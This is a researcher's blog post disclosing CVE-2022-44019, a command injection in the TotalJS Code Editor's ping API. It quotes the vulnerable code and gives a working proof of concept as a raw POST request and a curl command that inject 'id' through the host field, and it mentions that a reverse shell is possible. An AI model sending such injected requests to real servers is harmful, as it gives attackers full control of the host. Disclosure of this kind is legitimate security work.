<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <title>CVE-2022-44019 | Edoardo Ottavianelli</title>

    <meta name="robots" content="index,follow" />
    <link rel="canonical" href="https://www.edoardoottavianelli.it/" />
    <meta name="description"
        content="Edoardo Ottavianelli, Cybersecurity Student at Sapienza University. Passionate about Computing, Nature and cooking." />
    <meta name="keywords"
        content="Edoardo Ottavianelli, Cybersecurity, edoardottt Computer Science, Science, Information Technology, Software, Developer, Coding, Programming, Hardware, edoardo, ottavianelli" />
    <meta name="author" content="Edoardo Ottavianelli" />
    <meta name="copyright" content="Edoardo Ottavianelli" />
    <meta property="og:title" content="Edoardo Ottavianelli" />
    <meta property="og:site_name" content="Edoardo Ottavianelli" />
    <meta property="og:description"
        content="Edoardo Ottavianelli, Cybersecurity Student at Sapienza University. Passionate about Computing, Nature and cooking." />
    <meta property="og:type" content="website" />
    <meta property="og:url" content="https://www.edoardoottavianelli.it" />
    <meta property="og:image" content="https://www.edoardoottavianelli.it/media/og.png" />
    <meta property="og:image:secure_url" content="https://www.edoardoottavianelli.it/media/og.png" />
    <meta property="og:image:type" content="image/png" />
    <meta name="twitter:card" content="photo" />
    <meta name="twitter:title" content="Edoardo Ottavianelli" />
    <meta name="twitter:description"
        content="Edoardo Ottavianelli, Cybersecurity Student at Sapienza University.Passionate about Computing, Nature and cooking." />
    <meta name="twitter:image" content="https://www.edoardoottavianelli.it/media/og.png" />
    <meta name="twitter:url" content="https://www.edoardoottavianelli.it" />
    <meta name="twitter:site" content="@edoardottt2" />
    <meta name="twitter:creator" content="@edoardottt2" />
    <meta name="apple-mobile-web-app-title" content="Edoardo Ottavianelli" />
    <link rel="apple-touch-icon" sizes="144x144" href="https://www.edoardoottavianelli.it/media/logo_edo.png" />
    <meta name="application-name" content="edoardo ottavianelli" />
    <meta name="viewport" content="width=device-width" />
    <meta name="theme-color" content="#ffffff" />

    <!-- MDB icon -->
    <link rel="icon" href="../media/logo_edo.jpg">
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.11.2/css/all.css">
    <!-- Google Fonts Roboto -->
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700&amp;display=swap">
    <!-- Bootstrap core CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"
        integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
    <!-- Material Design Bootstrap -->
    <link href="https://cdnjs.cloudflare.com/ajax/libs/mdbootstrap/4.19.1/css/mdb.min.css" rel="stylesheet">
</head>

<body>
    <header>

        <!-- Navbar -->
        <nav class="navbar fixed-top navbar-expand-lg navbar-dark bg-primary white scrolling-navbar">
            <div class="container">

                <!-- Brand -->
                <a class="navbar-brand waves-effect" href="../index.html" title="home edoardo ottavianelli">
                    <strong class="white-text">edoardotttðŸ‘¹</strong>
                </a>

                <!-- Collapse -->
                <button class="navbar-toggler" type="button" data-toggle="collapse"
                    data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                    aria-label="Toggle navigation">
                    <span class="navbar-toggler-icon"></span>
                </button>

                <!-- Links -->
                <div class="collapse navbar-collapse" id="navbarSupportedContent">

                    <!-- Left -->
                    <ul class="navbar-nav mr-auto">
                        <li class="nav-item">
                            <a class="nav-link waves-effect" href="../index.html"
                                title="home edoardo ottavianelli">Home</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link waves-effect" href="../blog.html" title="Blog edoardo ottavianelli">Blog
                            </a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link waves-effect" href="../cve.html"
                                title="CVE edoardo ottavianelli">CVEs</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link waves-effect" href="../aboutme.html"
                                title="About me edoardo ottavianelli">About
                                me</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link waves-effect" href="../cv.html"
                                title="cv edoardo ottavianelli">Curriculum Vitae</a>
                        </li>
                    </ul>

                    <!-- Right -->
                    <ul class="navbar-nav nav-flex-icons">
                        <li class="nav-item">
                            <a href="https://instagram.com/edoardottt" class="nav-link waves-effect"
                                title="instagram edoardottt">
                                <i class="fab fa-instagram"></i>
                            </a>
                        </li>
                        <li class="nav-item">
                            <a href="https://twitter.com/edoardottt2" class="nav-link waves-effect"
                                title="twitter edoardottt">
                                <i class="fab fa-twitter"></i>
                            </a>
                        </li>
                        <li class="nav-item">
                            <a href="https://github.com/edoardottt"
                                class="nav-link border border-light rounded waves-effect" title="github edoardottt"
                                target="_blank">
                                <i class="fab fa-github mr-2"></i>GitHub
                            </a>
                        </li>
                    </ul>

                </div>

            </div>
        </nav>
        <!-- Navbar -->

    </header>
    <!--Main Navigation-->

    <!--Main layout-->
    <main class="mt-5 pt-5">
        <div class="container">

            <!--Section: Jumbotron-->
            <section class="card blue-gradient wow fadeIn" id="intro">

                <!-- Content -->
                <div class="card-body text-white text-center py-2 px-2 my-2">

                    <h1 class="mb-4">
                        <strong>Edoardo Ottavianelli</strong>
                    </h1>
                    <p class="mb-4">
                        <strong>Cybersecurity Student at Sapienza University.
                            Passionate about Computing, Nature and cooking.</strong>
                    </p>
                    <a target="_blank" href="mailto:edoardott@gmail.com" class="btn btn-outline-white btn-lg"
                        title="mail edoardo ottavianelli">Contact me
                        <i class="fas fa-envelope"></i>
                    </a>
                </div>
                <!-- Content -->
            </section>
            <!--Section: Jumbotron-->

            <!--Section: Cards-->
            <section class="pt-5">
                <div class="container">

                    <!--Grid row-->
                    <div class="row wow fadeInd-flex fadeIn justify-content-center">
                        <!--Grid column CENTER-->
                        <div class="col-1">
                            <br>
                        </div>
                        <!--Grid column-->

                        <!--Grid column-->
                        <div class="col-lg-10 col-xl-10 ml-xl-10 mb-10 view overlay rounded z-depth-1">
                            <h3 class="mb-3 font-weight-bold dark-grey-text">
                                <strong>CVE-2022-44019</strong>
                            </h3>
                            Author: Edoardo Ottavianelli<br>30/10/2022<br><br>

                            In this post I will go through CVE-2022-44019: the description, replication of the
                            vulnerability and POC.
                            <br><br>
                            <a target="_blank" href="https://github.com/totaljs" alt="totaljs">TotalJS</a> is an
                            Open-source JavaScript
                            platform providing
                            a lot of FOSS tools and libraries written in Javascript/NodeJS. This vulnerability affects
                            the TotalJS Code Editor product.
                            (<a target="_blank" href="https://github.com/totaljs/code">link to the GitHub repo</a>).
                            From the <a target="_blank" href="https://www.totaljs.com/code">Official Code Editor
                                website</a> we can
                            read:
                            <br>
                            <cite>"Try our best practices with the new Code Editor as a web application to develop
                                Total.js applications. Get more time for yourself and simplify your web development as
                                never
                                before. Code Editor must run on your server directly where you provide web applications.
                                You
                                can provide Code Editor, for example, on your Raspberry Pi."</cite>.
                            <br><br>

                            <img src="code.jpg" width="100%" title="totaljs cms" alt="totaljs code">
                            <br>

                            <h4>Description of the vulnerability</h4>
                            Using the API /api/common/ping it's possible to achieve remote command execution on the host
                            machine. This leads to complete control over the machine hosting the server.
                            <br><br>
                            This is the vulnerable code:<br><br>
                            <pre>
schema.addWorkflow('ping', function($) {
    var host = $.model.host.replace(/'|"|\n/g, '');
    Exec('ping -c 3 {0}'.format(host), $.done(true));
});
                            </pre>
                            Here the problem is the fact that the server doesn't sanitize correctly the input checking
                            that the host provided is a legitimate one, allowing also characters like <b>;</b> ,
                            <b>|</b>
                            or <b>&</b>.
                            <br><br>

                            <h4>Replication of the vulnerability</h4>
                            <ul>
                                <li>Execute <b>node index.js</b> to start the server</li>
                                <li>Login in the application.</li>
                                <li>Execute this request as shown below:</li>
                            </ul>
                            <img src="poc1.png" width="100%" title="totaljs code cve poc" alt="totaljs code cve poc">
                            <br><br>
                            The command that will be executed is <b>ping -c 3 1.1.1.1; id</b>.<br>
                            The injected command is <b>id</b>, but of course can be an arbitrary command (a reverse
                            shell as well).<br><br>
                            <h4>POC</h4>
                            See the Youtube Video POC here:<br>
                            <iframe width="560" height="315" src="https://www.youtube.com/embed/x-u3eS8-xJg"
                                title="YouTube video player" frameborder="0"
                                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
                                allowfullscreen></iframe>
                            <br><br>
                            Capture a request in a proxy (like Burpsuite) and then change the parameters (Host with your
                            target, User-Agent and Authentication Cookie):<br><br>
                            <pre>
POST /api/common/ping HTTP/1.1
Host: 0.0.0.0:8000
User-Agent: bla-bla-bla
Cookie: your-auth-cookie
Content-Length: 15
                                
host=1.1.1.1;id
                            </pre>
                            <br>
                            Curl command (replace with your parameters):
                            <pre>
curl -i -s -k -X $'POST' \
-H $'Host: 0.0.0.0:8000' -H $'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0' -H $'Content-Length: 15' -H $'Content-type: application/x-www-form-urlencoded' \
-b $'KltYiafZCc=14520-39383d41035706110118556e1917510d57341c5145461b5d52595013170017074353540d626b3732187f66160641481d111c1151461856040d06084709575641024e073c1c1c020e54304c0b144613632d' \
--data-binary $'host=1.1.1.1;id' \
$'http://0.0.0.0:8000/api/common/ping'
                            </pre>
                            <br><br>

                            <h4>References</h4>
                            <ul>
                                <li><a target="_blank"
                                        href="https://nvd.nist.gov/vuln/detail/CVE-2022-44019">https://nvd.nist.gov/vuln/detail/CVE-2022-44019</a>
                                </li>
                                <li><a target="_blank"
                                        href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-44019">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-44019</a>
                                </li>
                                <li><a target="_blank"
                                        href="https://github.com/totaljs/code/issues/12">https://github.com/totaljs/code/issues/12</a>
                                </li>
                            </ul>
                            <br><br><br>

                        </div>
                        <!--Grid column-->
                        <!--Grid column CENTER-->
                        <div class="col-1">
                            <br>
                        </div>
                        <!--Grid column-->
                    </div>
                    <!--Grid row-->
                </div>
            </section>
            <!--Section: Cards-->

        </div>
    </main>
    <!--Main layout-->

    <!--Footer-->
    <footer class="page-footer text-center font-small mdb-color darken-2 mt-4 wow fadeIn">

        <!--Call to action-->
        <div class="pt-4">
            <a class="btn btn-outline-white" href="mailto:edoardott@gmail.com" target="_blank" role="button"
                title="mail edoardo ottavianelli">Contact me
                <i class="fas fa-envelope ml-2"></i>
            </a>
        </div>
        <!--/.Call to action-->

        <hr class="my-4">

        <!-- Social icons -->
        <div class="pb-4">
            <a href="https://www.facebook.com/edoardo.ottavianelli" target="_blank"
                title="facebook edoardo ottavianelli">
                <i class="fab fa-facebook-f mr-3"></i>
            </a>

            <a href="https://twitter.com/edoardottt2" target="_blank" title="twitter edoardo ottavianelli">
                <i class="fab fa-twitter mr-3"></i>
            </a>

            <a href="https://github.com/edoardottt" target="_blank" title="github edoardo ottavianelli">
                <i class="fab fa-github mr-3"></i>
            </a>

            <a href="https://instagram.com/edoardottt" target="_blank" title="instagram edoardo ottavianelli">
                <i class="fab fa-instagram mr-3"></i>
            </a>

            <a href="https://www.linkedin.com/in/edoardoottavianelli/" target="_blank"
                title="linkedin edoardo ottavianelli">
                <i class="fab fa-linkedin mr-3"></i>
            </a>

            <a href="https://t.me/edoardottt" target="_blank" title="telegram edoardo ottavianelli">
                <i class="fab fa-telegram mr-3"></i>
            </a>

            <a href="https://stackoverflow.com/users/8155097/edoardottt" target="_blank"
                title="stackoverflow edoardo ottavianelli">
                <i class="fab fa-stack-overflow mr-3"></i>
            </a>

            <a href="https://www.youtube.com/@edoardottt" title="edoardo ottavianelli youtube" target="_blank">
                <i class="fab fa-youtube mr-3"></i>
            </a>

            <a href="https://www.hackerrank.com/edoardottt" title="edoardo ottavianelli hackerrank" target="_blank">
                <i class="fab fa-hackerrank mr-3"></i>
            </a>

            <a href="https://dev.to/edoardottt" title="edoardo ottavianelli dev.to" target="_blank">
                <i class="fab fa-dev mr-3"></i>
            </a>

        </div>
        <!-- Social icons -->

        <!--Copyright-->
        <div class="footer-copyright py-3">
            &#xA9; edoardottt <br>Thanks to
            <a href="https://mdbootstrap.com/education/bootstrap/" target="_blank"> MDBootstrap.com </a>
        </div>
        <!--/.Copyright-->

    </footer>
    <!--/.Footer-->

    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"
        integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"
        async></script>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"
        integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"
        async></script>

    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"
        integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"
        async></script>

    <script type="text/javascript" src="../js/mdb.min.js" async></script>

    <script type='application/ld+json'>
        {
            "@context": "http://www.schema.org/",
            "@type": "Person",
            "name": "Edoardo Ottavianelli",
            "jobTitle": "Software Developer",
            "url": "https://www.edoardoottavianelli.it",
            "image": "https://www.edoardoottavianelli.it/logo_edo.jpg",
            "sameAs": ["https://www.facebook.com/edoardo.ottavianelli", "https://twitter.com/edoardottt2", "https://www.instagram.com/edoardottt", "https://www.linkedin.com/in/edoardoottavianelli/"],
            "email": "edoardott@gmail.com"
        }
    </script>
    <script type="text/javascript">
        new WOW().init();
    </script>
</body>

</html>